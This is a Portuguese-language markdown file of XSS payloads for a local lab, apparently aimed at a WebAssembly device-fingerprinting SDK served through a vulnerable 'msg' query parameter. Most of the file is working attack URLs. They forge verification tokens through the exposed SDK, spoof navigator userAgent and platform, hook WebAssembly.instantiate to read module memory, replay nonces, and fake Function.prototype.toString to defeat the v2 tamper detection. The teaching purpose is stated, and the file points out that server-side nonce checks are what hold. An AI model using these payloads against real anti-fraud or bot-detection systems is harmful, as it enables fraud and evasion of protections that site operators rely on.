# Payloads de XSS (lab local — só contra o seu próprio integrador)

Todos entram pelo parâmetro vulnerável `?msg=` de `integrador.html` (v1) ou
`integrador-v2.html` (v2). O sink é `innerHTML`, então usamos `<img onerror>`
para executar JS. Abra o DevTools → Console para ver os `console.log`.

> Dica: ao colar na barra de endereço, o navegador costuma tolerar o payload
> cru. Se algo não disparar, codifique com `encodeURIComponent` o trecho depois
> de `msg=`.

---

## (a) Usar o SDK global para forjar uma submissão arbitrária

Funciona na **v1** porque `window.sdk` expõe `init()` e `gerar_token()`.

```
/integrador.html?msg=<img src=x onerror="(async()=>{await window.sdk.init();const n=await (await fetch('/nonce')).text();const s=JSON.stringify({userAgent:'XSS-forjado',platform:'Win32'});const t=window.sdk.gerar_token(n,s);const r=await (await fetch('/verificar',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce:n,sinais:s,token:t})})).json();console.log('ATAQUE a:',r);})()">
```

Esperado v1: **aprovado**. O XSS dirige o SDK como se fosse a página legítima.

---

## (b) Monkey patch de navigator para se passar por iPhone

Troca `userAgent` E `platform` de forma coerente e roda o fluxo honesto.

```
/integrador.html?msg=<img src=x onerror="Object.defineProperty(navigator,'userAgent',{get:()=>'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',configurable:true});Object.defineProperty(navigator,'platform',{get:()=>'iPhone',configurable:true});window.sdk.rodar();">
```

Esperado v1: **aprovado** (spoof coerente passa pela consistência).
Variante desleixada (só `userAgent`): **suspeito**.

---

## (c) Hook de WebAssembly.instantiate (injetado ANTES do SDK instanciar)

Instala o hook; quando você clicar em "Rodar SDK", ele captura exports/memória.

```
/integrador.html?msg=<img src=x onerror="(()=>{const orig=WebAssembly.instantiate;WebAssembly.instantiate=async function(...a){const r=await orig.apply(this,a);const inst=r.instance||r;window.__cap=inst;console.log('HOOK: capturei exports =',Object.keys(inst.exports),'| memory bytes =',inst.exports.memory.buffer.byteLength);return r;};console.log('hook instalado; agora clique em Rodar SDK');})()">
```

Depois de clicar em "Rodar SDK", no Console: `window.__cap.exports.gerar_token`
está acessível e `new Uint8Array(window.__cap.exports.memory.buffer)` lê a
linear memory. Esperado v1: **aprovado** (sem detecção).

---

## (d) Replay de um nonce antigo

Envia o MESMO nonce duas vezes.

```
/integrador.html?msg=<img src=x onerror="(async()=>{await window.sdk.init();const n=await (await fetch('/nonce')).text();const s=JSON.stringify({userAgent:navigator.userAgent,platform:navigator.platform});const t=window.sdk.gerar_token(n,s);const p={method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce:n,sinais:s,token:t})};console.log('1o:',await (await fetch('/verificar',p)).json());console.log('replay:',await (await fetch('/verificar',p)).json());})()">
```

Esperado: 1º **aprovado**, 2º **rejeitado** (nonce já usado). Esta é a barreira
que o cliente não consegue contornar — mora no servidor.

---

## (e) Bypass da v2 — falsificar toString (contra integrador-v2.html)

Roda ANTES do SDK: hooka `instantiate`, patcha o getter de `navigator` no
PROTÓTIPO (não deixa própria), e falsifica `toString` para tudo parecer nativo.
Resultado: a v2 manda flags LIMPAS → o servidor aprova um ambiente adulterado.

```
/integrador-v2.html?msg=<img src=x onerror="(()=>{const real=Function.prototype.toString;const mente=new WeakSet();const px=new Proxy(real,{apply(t,c,a){if(mente.has(c)||c===px)return'function () { [native code] }';return Reflect.apply(t,c,a);}});mente.add(px);Function.prototype.toString=px;const oi=WebAssembly.instantiate;WebAssembly.instantiate=function(...a){return oi.apply(this,a)};mente.add(WebAssembly.instantiate);const proto=Object.getPrototypeOf(navigator);const gUA=function(){return'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'};const gP=function(){return'iPhone'};mente.add(gUA);mente.add(gP);Object.defineProperty(proto,'userAgent',{get:gUA,configurable:true});Object.defineProperty(proto,'platform',{get:gP,configurable:true});console.log('bypass instalado; clique Rodar SDK');})()">
```

Esperado v2: **aprovado** com flags falsas. Mas tente também o replay (payload d)
na v2: continua **rejeitado**. O que sobra de proteção real é do servidor.

---

Para ver os mesmos vereditos no terminal (sem navegador):

```
node server.js 8000          # num terminal
node attack/demo.js          # noutro: ataques contra a v1
node attack/demo.js v2       # ataques contra a v2
```
